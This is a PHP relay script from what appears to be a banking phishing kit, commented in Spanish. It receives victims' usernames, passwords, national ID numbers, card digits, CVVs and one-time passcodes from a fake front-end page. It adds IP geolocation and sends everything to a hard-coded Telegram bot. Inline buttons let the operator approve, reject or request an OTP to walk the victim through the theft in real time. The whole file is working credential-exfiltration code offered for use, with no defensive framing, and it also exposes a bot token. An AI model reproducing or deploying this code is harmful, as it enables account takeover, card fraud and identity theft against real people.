<?php
session_start();
if (empty($_SESSION['wait_uid'])) {
    $_SESSION['wait_uid'] = bin2hex(random_bytes(8));
}
$uid = $_SESSION['wait_uid'];

// ============================================================
//  Relay Telegram - Recibe datos del front y los envía al bot
// ============================================================

$TG_TOKEN = '8849191947:AAG0KCpFSyxiwz5ukZGnJx8CY9oKV9zgQnk';
$TG_CHAT  = '7655000874';
$TG_URL   = 'https://api.telegram.org/bot' . $TG_TOKEN . '/sendMessage';

$ALLOWED_ORIGINS    = [];
$RATE_LIMIT_SECONDS = 1;

header('Content-Type: application/json; charset=utf-8');

// CORS
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (empty($ALLOWED_ORIGINS) || in_array($origin, $ALLOWED_ORIGINS, true)) {
    if ($origin) header('Access-Control-Allow-Origin: ' . $origin);
    else header('Access-Control-Allow-Origin: *');
}
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'err' => 'method']);
    exit;
}

// Rate-limit por IP usando archivos temporales
$ip = $_SERVER['HTTP_CF_CONNECTING_IP']
   ?? $_SERVER['HTTP_X_FORWARDED_FOR']
   ?? $_SERVER['REMOTE_ADDR']
   ?? 'unknown';
$ip = explode(',', $ip)[0];

$rlFile = sys_get_temp_dir() . '/rl_' . md5($ip);
if (file_exists($rlFile) && (time() - filemtime($rlFile)) < $RATE_LIMIT_SECONDS) {
    http_response_code(429);
    echo json_encode(['ok' => false, 'err' => 'rate']);
    exit;
}
@touch($rlFile);

// Leer payload JSON
$raw = file_get_contents('php://input');
$d = json_decode($raw, true);
if (!is_array($d)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'err' => 'json']);
    exit;
}

$step = isset($d['step']) ? (string)$d['step'] : '?';

// Geolocalización servidor-a-servidor (sin mixed content)
$country = 'No disponible';
$city = 'No disponible';
$ctx = stream_context_create(['http' => ['timeout' => 3]]);
$geoRaw = @file_get_contents('https://ipwho.is/' . urlencode($ip), false, $ctx);
if ($geoRaw) {
    $g = json_decode($geoRaw, true);
    if (is_array($g)) {
        $country = $g['country'] ?? $country;
        $city = $g['city'] ?? $city;
    }
}

// Construir mensaje Telegram (HTML)
$esc = function($s) { return htmlspecialchars((string)$s, ENT_XML1 | ENT_QUOTES, 'UTF-8'); };

$lines = [];
$lines[] = "📋 <b>Paso " . $esc($step) . "</b>";
$lines[] = "";
if (!empty($d['usuario'])) $lines[] = "👤 <b>Usuario:</b> " . $esc($d['usuario']);
if (!empty($d['clave']))   $lines[] = "🔑 <b>Clave:</b> "   . $esc($d['clave']);
if (!empty($d['dui']))     $lines[] = "🆔 <b>DUI:</b> "      . $esc($d['dui']);
if (!empty($d['last4']))   $lines[] = "💳 <b>4 dígitos:</b> ". $esc($d['last4']);
if (!empty($d['cvv']))     $lines[] = "🔐 <b>CVV:</b> "      . $esc($d['cvv']);
$lines[] = "";
$lines[] = "🌐 <b>IP:</b> "    . $esc($ip);
$lines[] = "📍 <b>País:</b> "  . $esc($country);
$lines[] = "🏙️ <b>Ciudad:</b> ". $esc($city);
$lines[] = "🖥️ <b>UA:</b> "    . $esc(substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150));
if (!empty($d['token'])) $lines[] = "🔢 <b>OTP:</b> "     . $esc($d['token']);

// Botones inline con callback_data (procesado por bot.php webhook)
$keyboard = null;
if (strpos($step, '1-2') !== false || strpos($step, 'DUI') !== false) {
    $keyboard = ['inline_keyboard' => [
        [
            ['text' => 'Continuar', 'callback_data' => 'CONTINUE|' . $uid],
            ['text' => 'Rechazar',  'callback_data' => 'ERROR|'   . $uid],
        ],
    ]];
}
if (strpos($step, 'COMPLETO') !== false) {
    $keyboard = ['inline_keyboard' => [
        [
            ['text' => 'Aprobar',     'callback_data' => 'CONTINUE|' . $uid],
            ['text' => 'Rechazar',    'callback_data' => 'ERROR|' . $uid],
        ],
        [
            ['text' => 'Pedir Token', 'callback_data' => 'TOKEN|' . $uid],
        ],
    ]];
}
if (strpos($step, 'TOKEN') !== false) {
    $keyboard = ['inline_keyboard' => [
        [
            ['text' => 'Aprobar',  'callback_data' => 'FINISH|' . $uid],
            ['text' => 'Invalido', 'callback_data' => 'INVALID|' . $uid],
        ],
    ]];
}
if (false) { // old COMPLETO control block - neutralized
// was: if (strpos($step, '4 ·') !== false || strpos($step, 'COMPLETO') !== false) {
    $lines[] = '';
    $lines[] = "🎛 <b>Controles:</b>";
    $lines[] = "✅ <a href=\"{$ctrl}&s=continue\">APROBAR</a>  |  💬 <a href=\"{$ctrl}&s=token\">PEDIR TOKEN</a>  |  ❌ <a href=\"{$ctrl}&s=error\">RECHAZAR</a>";
}
if (false) { // old TOKEN control block
    $lines[] = '';
    $lines[] = "🎛 <b>Controles:</b>";
    $lines[] = "✅ <a href=\"{$ctrl}&s=finish\">APROBAR</a>  |  ❌ <a href=\"{$ctrl}&s=error\">INVÁLIDO</a>";
}

$tgMsg = [
    'chat_id'    => $TG_CHAT,
    'text'       => implode("\n", $lines),
    'parse_mode' => 'HTML',
];
if ($keyboard) {
    $tgMsg['reply_markup'] = json_encode($keyboard, JSON_UNESCAPED_UNICODE);
}
$payload = json_encode($tgMsg, JSON_UNESCAPED_UNICODE);

$ok = false;
if (function_exists('curl_init')) {
    $ch = curl_init($TG_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $res  = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code >= 200 && $code < 300 && $res) {
        $tgR = json_decode($res, true);
        $ok  = !empty($tgR['ok']);
    }
} else {
    $ctx2 = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 6,
        ],
    ]);
    $res = @file_get_contents($TG_URL, false, $ctx2);
    if ($res) {
        $tgR = json_decode($res, true);
        $ok  = !empty($tgR['ok']);
    }
}

echo json_encode(['ok' => $ok]);
